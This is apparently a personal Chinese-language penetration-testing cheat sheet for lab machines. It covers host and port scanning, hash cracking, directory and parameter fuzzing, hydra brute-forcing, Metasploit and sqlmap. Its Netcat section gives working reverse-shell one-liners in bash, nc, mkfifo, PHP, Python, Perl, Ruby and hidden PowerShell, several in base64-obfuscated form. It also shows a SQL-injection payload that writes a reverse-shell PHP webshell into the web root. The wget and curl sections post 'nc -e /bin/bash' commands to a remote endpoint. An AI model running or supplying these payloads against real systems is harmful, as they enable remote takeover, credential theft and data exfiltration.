## arp-scan

利用arp找到存活的主机并收集其网络信息

```bash
#-I指定扫描哪个网卡连接到的网络的设备，-l指定扫描本计算机所在的网络中
sudo arp-scan -l -I eth0
sudo arp-scan -I eth0 ip(or IPCIDR)
```

## nmap

探测端口是否开放，默认会先ping确定主机是否存活，避免对主机进行不必要的端口扫描，可能有些防火墙禁ping，因此一般用-Pn来避免nmap用ping探测主机存活状态，而用arp-scan探测主机存活状态。

```bash
#SYN扫描（半开放扫描、隐身扫描）
主要用于扫描端口开放状态。
发送一个SYN表示请求建立连接，如果目标端口关闭会回复RST数据包，开放会响应SYN/ACK数据包，如果数据包被防火墙阻挡或过滤器阻挡（此时就不知道这个端口是否开放了），会返回一个ICMP错误消息（一般为端口不可达）。nmap如果收到了相应的SYN/ACK数据包会马上回复一个RST，避免建立连接。
#ACK扫描
主要用于检测防火墙和过滤器是否存在。
在未建立连接时发送ACK报文，如果被防火墙和过滤器阻挡会返回一个ICMP错误消息，否则无论是否开放端口都会返回一个RST数据包。
#UDP扫描
默认用TCP扫描，UDP扫描不准确。因此UDP扫描没有确认机制，UDP扫描在端口关闭和存在防火墙过滤器的情况下都会返回一个ICMP错误消息（因此无法判断是否端口开放），在开放的情况下没有任何回复（除非有对udp包回应的应用层代码）。
#FIN扫描
一般用于绕过防火墙和过滤器阻挡进行端口检测。
因为防火墙和过滤器对FIN的检测不如对SYN的检测严格，开放的端口会忽略FIN，关闭的端口会响应一个RST数据包。
#Xmas扫描
一般用于绕过防火墙和过滤器阻挡进行端口检测。
同FIN扫描，但还设置了FIN、URG和PSH标志，开放的端口会忽略FIN，关闭的端口会响应一个RST数据包。
#NULL扫描
一般用于绕过防火墙和过滤器阻挡进行端口检测。
发送一个不设置任何标志的数据包，因为防火墙和过滤器可能不会过滤和处理这种不设置任何标志的数据包，开放的端口会忽略，关闭的端口会响应一个RST数据包。
```

```bash
#小写-s代表scan，-Pn代表no ping，-p-代表所有1-65536所有端口，-p指定扫描的端口，-iL指定扫描某个文件的所有ip
sudo nmap -sS -Pn -p- 192.168.6.166
```

## john(类似hashcat)

##### libreoffice2john，用于提取加密文档的hash

```bash
libreoffice2john 目标文件 > 输出文件
```

##### zip2john,用于提取zip文档的hash

```bash
zip2john 目标文件 > 输出文件
```

##### john用于破解密码hash,主要靠爆破，因此需要字典（john会自动识别hash类型，但是可能会失败，因此需要hash-identifier、hashid)

```bash
#john可以破解的加密算法
#MD4、MD5、SHA1、NTLM等
```

```bash
#f代表format可以省略，w代表wordlist
john -f=加密类型 -w=字典 目标文件
#用--show查看结果
john --show 目标文件
```

## hashid

```bash
#查看文件的hash类型
```

## gobuster

向服务器发送http请求，尝试访问路径并根据相应确定路径是否存在（确定的原理为判断是否返回状态为404）

没有查到的路径不代表路径不存在，只是可能被设置无权限访问也返回了404

```bash
#
#dir参数用于目录和文件枚举，-x代表指定爆破的扩展文件名，和字典的内容组合实现爆破
gobuster dir -u 'http://192.168.6.166/' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip,bak,jpg,txt,html


#指定cookie和user-agent
#--exclude-length过滤长度
#-b过滤响应码
########fuzz模式不能用-x指定文件类型
gobuster fuzz -u 'http://192.168.6.166/' -c 'PHPSESSID=6kbbdns7ne5fr2a71146mio2vn' -a 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --exclude-length 1128
```

## wfuzz

使用模糊测试的方法爆破路径，例如已知存在路径/scout/xxx/docs/，要获得xxx

（同gobuster，没查到的路径不代表不存在）

```bash
#用FUZZ作为通配符进行模糊测试,hc即hide code隐藏404响应,hl为hide length
wfuzz -c -t 200 -u 'http://192.168.6.166/scout/FUZZ/docs/' -w /usr/share/wordlists/dirb/big.txt --hc=404 --hl 3
```

## ffuf

使用模糊测试的方法爆破URL参数

```bash
#FUZZ作为通配符进行模糊测试

#爆破参数名
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 'http://192.168.6.166/thejabasshell.php?FUZZ=whoami' -fw 1
#爆破参数值
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 'http://192.168.6.166/thejabasshell.php?a=whoami&b=FUZZ' -fw 1


#指定响应码-mc
#-fs排除size大小，-fc排除状态码
#爆破指定http头部
-H "Cookie:cooke_value"
-H "User-Agent:User-Agent_value"
#例如
ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u "http://192.168.6.158/casino/explainmepls.php?learnabout=127.0.0.1:6969/codebreakers/FUZZ" -fc 400 -fs 1128 -H "Cookie:PHPSESSID=1v29r1ecanau39c969mcbfktqq" -H "User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"

#用post测试
ffuf -u 'http://192.168.6.232/auth.php' -X POST -d 'FUZZ=1' -w '/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt' -H 'Cookie:PHPSESSID=420r2se44hsbes95uufs76f1k4' -H 'User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36' -fs 0
```

## Netcat

在一台服务器上监听某个端口后，在靶机上请求向该ip端口建立连接（反弹shell）

也可以探测某ip端口是否开放和是否运行服务

netcat使用TCP和UDP建立连接，默认使用TCP



### 一定要注意转义和引号闭合问题，比如在mysql中写入php的脚本，要么就mysql用双引号，php用单引号，要么就转义

```bash
#错误写法，这里exec中的第一个单引号就把<?php前的单引号给闭合了。
#而且exec的第一个单引号会把-c后边（bash前边）的单引号闭合。
select * from users where id=1 union select 1,'<?php exec('/bin/bash -c 'bash -i >& /dev/tcp/192.168.6.149/6666 0>&1'') ?>',3 into outfile '/var/www/html/1.php';

#正确写法
select * from users where id=1 union select 1,'<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/192.168.6.149/6666 0>&1\'") ?>',3 into outfile '/var/www/html/1.php';
```



```bash
###PS：eval执行的是一段PHP代码，system和exec执行的是一段系统命令
###因此eval和webshell搭配（无法执行bash -i等反弹shell的命令，且蚁剑等需用POST），system、exec和bash、mkfifo搭配（反弹shell，一般bash要进行编码）


#探测某ip端口是否开放和是否运行服务
┌──(dxt㉿kali)-[~]
└─$ nc 192.168.6.178 22
SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1
#监听本机某ip的某端口,可以不加ip，l代表listen，v代表verbose，p代表port
nc -lvp (127.0.0.1) 5555

#建立反向连接
bash -i >& /dev/tcp/192.168.6.149/5555 0>&1

###PS：这个是用于上传一个反弹shell使得每次访问就可以执行这个反弹shell的
#PHP的（eval不能用，因为eval执行的是php代码不是系统命令）
<?php exec('/bin/bash -c "bash -i >& /dev/tcp/192.168.6.149/6666 0>&1"') ?>
<?php system('/bin/bash -c "bash -i >& /dev/tcp/192.168.6.149/6666 0>&1"') ?>
#之所有不能直接使用bash -i，而还要使用/bin/bash -c声明解释器是因为php的system默认使用的/bin/sh是dash而不是bash，就算后边有bash -i，也是将整个命令先传递给默认shell(dash)解析后显示调用bash，但是dash是解析不了>&这些符号的，所以调用了bash也没用，无法建立反弹shell。
#而直接在命令行输入可以建立是因为对命令行来说这是一个显示的调用bash处理的命令，而并不会先由默认的shell(dash)解析，所以可以建立反弹shell。


###PS：这个是用于访问$_GET['cmd']的时候传入的命令，URL会错误解析>&，所以需要用base64
#反向连接base64编码其中特别注意-i和7777后都有两个空格（即>或者&前应该多一个空格），用base64编码，后边用url编码
echo "bash -i  >& /dev/tcp/192.168.6.149/7777  0>&1" |base64 -d |bash
echo "YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTkyLjE2OC42LjE0OS83Nzc3ICAwPiYx"%20%7cbase64%20-d%20%7cbash



#或者使用nc
nc -c /bin/bash 192.168.6.149
nc 192.168.6.149 5555 -e /bin/bash
nc 192.168.6.149 5555
#有的时候版本不同，不支持-e选项，可以尝试去掉-e，用-c或者直接不用
#然后用srcipt启动一个新的bash shell
script /dev/null -c bash
script -qc "/bin/bash -i" /dev/null


#或者使用mkfifo命名管道
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 192.168.6.149 7777 > /tmp/f
#编码方式
echo "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i  2>&1 | nc 192.168.6.149 7777 >  /tmp/f" | base64 -d |bash
echo%20"cm0gLWYgL3RtcC9mOyBta2ZpZm8gL3RtcC9mOyBjYXQgL3RtcC9mIHwgL2Jpbi9iYXNoIC1pICAyPiYxIHwgbmMgMTkyLjE2OC42LjE0OSA3Nzc3ICA+IC90bXAvZg=="%20%7c%20base64%20-d%20%7cbash





#或者php
php -r '$sock=fsockopen("192.168.6.149",5555);exec("/bin/sh -i <&3 >&3 2>&3");'

#或者python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.6.149",5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

#或者perl
perl -e 'use Socket;$i="192.168.6.149";$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

#或者ruby
ruby -rsocket -e'f=TCPSocket.open("192.168.6.149",5555).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

#或者windows powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("192.168.6.149",5555);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
#以上都不能用的时候只能看能不能进行文件上传，上传一个服务器支持的语言的反向连接代码然后运行
```

## Wget

```bash
#用wget以post形式向某个网页提交数据
#-O指定输出文件名，-代表直接标准输出在命令行上，--header指定提交类型（没有严格过滤的时候不指定，即去掉--header也可以）
wget --header="Content-Type: application/json"
--post-data='{"command":"nc 192.168.6.149 6666 -e /bin/bash"}' http://127.0.0.1:8000/priv.php -O-
#get形式（进行了URL编码）
wget "http://127.0.0.1:8000/priv.php?command=nc%20192.168.6.149%206666%20-e%20/bin/bash"
#用put提交数据(提交的数据在文件中则关键字为--body-file)
wget --method=PUT --body-data='' --header='' http://ip:port/
#下载网页信息
wget http://127.0.0.1:8000/priv.php
#可以用-A来指定用户代理
wget -A 'user_name' ........
```

## Curl

```bash
#查看网页信息
curl http://127.0.0.1:8000/priv.php
#下载网页信息
curl -o xxx http://127.0.0.1:8000/priv.php
#用curl以post形式向某个网页提交表单（必须大写POST）
curl -X POST -d "command=nc 192.168.6.149 6666 -e /bin/bash" http://127.0.0.1:8000/priv.php
#用curl以post形式向某个网页提交json数据
curl -X POST -H "Content-Type: application/json" -d '{"command":"nc 192.168.6.149 6666 -e /bin/bash"}' http://127.0.0.1:8000/priv.php
#用curl以post提交xml数据
curl -X POST -H "Content-Type: application/xml" -d '<command>nc 192.168.6.149 6666 -e /bin/bash</command>' http://127.0.0.1:8000/priv.php
#用curl以get提交请求（进行了URL编码）
curl "http://127.0.0.1:8000/priv.php?command=nc%20192.168.6.149%206666%20-e%20/bin/bash"
#用crul以put提交数据
curl -XPOST -H "" -d '' http://ip:port/
```

## hydra

用字典进行密码破解，支持包括ssh在内的多种协议,包括ftp、telnet、http、pop3、imap、mysql、rdp等等，只需要改变ssh字段为协议名即可

```bash
#-l指定用户名，-L指定用户名列表（用户名字典），-P指定密码列表（密码字典）
#-t指定并行任务数，-W指定可等待连接的时间（超过即判定口令不对），-vV启用详细输出，-I跳过上次直接退出的恢复等待
hydra -l username -P dictionary ssh://ip(:port)


#用post方式爆破
#:后边跟的是登录失败提示的错误消息，和每个网站的设计有关
hydra -l root -P /usr/share/wordlists/rockyou.txt -t 64 192.168.6.158 http-post-form "/index.php:username=^USER^&password=^PASS^:Error with user or password"
```

## OpenSSL

加密文件、解密文件、生成密钥



## MSF

#### 1、ssh_login

ssh登录到靶机等，然后可以在远程主机上用msf所在主机的工具

```bash
#位置auxiliary/scanner/ssh/ssh_login
use auxiliary/scanner/ssh/ssh_login
#
set RHOSTS ip
set USERNAME remote_username
set PASSWORD remote_password
set RPORT port

run
#获取会话
sessions -i
```

2、search

根据名字搜索利用脚本

```bash
search vul_name
```

3、sessions

```bash
#查看所有会话
sessions -l
#进入某个会话
sessions -i session_id
```



## sqlmap

```bash
#1、基本参数
-u'':url，默认GET
-r'':读文件，默认POST
--data=:post方式扫描（需要复制全部post表单内容）
-p'':指定要扫描的参数
-f:指纹判别数据库类型
-b:获取数据库版本信息
*:加在参数后（id=1*），优先扫描
-D'',-T'',-C''，-U'':指定库，表，列，用户
--current-db,--current-user:获取当前数据库名，当前用户名
--dbs,--tables,--column，--dump，--users，--passwords,--privileges:获取指定（不指定就是所有）数据库名、表名、列名，数据，用户，密码,权限（--column和--dump在不指定时都只能获取当前数据库所有列名和数据）
--batch:默认配置
--level=:1-5级，要执行的测试水平等级，默认为1。检测级别大于等于2时会检测 cookie 是否有注入，检测级别大于等于3时会检测User-Agent和Referer是否有注入
--risk=:0-3级，测试执行的风险等级，默认为1，探测等级一个意思，在不确定的情况下，建议设置为3级

--cookie=:自定义http该字段
###注意：在进行Cookie注入测试时，重定向的不行，必须是带cookie字段的http报文才可以（他不能重定向以后再自己测试）
--referer=:自定义http该字段
--user-agent=:自定义http该字段
--purge:清除缓存
--dump-all：获取数据库全部数据（慢）
--shell-os:获取靶机shell
--tamper=:绕过方式，默认位于/usr/share/sqlmap/tamper/

-v  #详细的等级(0-6) 
    0：只显示Python的回溯，错误和关键消息。 
    1：显示信息和警告消息。 
    2：显示调试消息。 
    3：有效载荷注入。 
    4：显示HTTP请求。 
    5：显示HTTP响应头。 
    6：显示HTTP响应页面的内容





-u:扫描某url(GET方式)

-r:扫描某以POST方式提交的http请求（-r目标为.txt文件，POST方式）

-p:指定POST方式下扫描的注入表单参数

-D:已知的库名

--dbs:给出所有数据库

--current-db：给出当前所在数据库

-T:已知的表名

--tables：给出所有表名

-C:已知的列名

--colums：给出所有列名

--dump:加载所有当前列的数据 //尽量不用，会加载所有数据

-m txt.txt批量扫描url（不加-u）

总体上以上的用法即先看有没有注入点，然后--dbs爆数据，--current-db爆当前数据库，-D xxx --tables爆表，-D xxx -T xxx --colums爆列，-D xxx -T xxx --C xxx,xxx,xxx --dump爆具体数据。
```

## nikto



## python开http

```bash
#在本地port开启一个http服务器,默认网页文件位置是当前执行命令路径
python -m http.server port
```

## AntSword

```bash
#蚁剑创建的webshell是无法进行sudo su的，好像是因为因为是虚拟终端，无法实现这种交互式的行为
```

## ping6

```bash
#nmap扫描ipv6,要用%在ipv6地址中指定目标网卡
sudo nmap -6 -p- ipv6_value%Ethernet_id
#ping找到网络内所有ipv6，-I指定扫描的网卡
ping 6 -I eth0 ipv6_value
#查看ipv6的MAC
ip -6 neigh show
```

## searchsploit

用于搜索可利用的脚本和方法

```bash
searchsploit vul_name
#得到的脚本和方法的默认路径
/usr/share/exploitdb/exploits/
```

## smbmap

查看smb中的共享文件的访问权限

```bash
#-H指定目标主机，-u指定以何身份访问
smbmap -H 192.168.6.174 -u guest
```

## smbclient

获取smb中的共享文件，进入smb后会出现一个交互式smb的命令行

```bash
#连续\\是因为避免\被转义,注意-U是大写，指定访问用户
smbclient \\\\192.168.6.173\\DebianShare -U guest
#查看有哪些文件
dir
#获取文件（会自动下载到运行smbclient时的目录）
get file_name
```

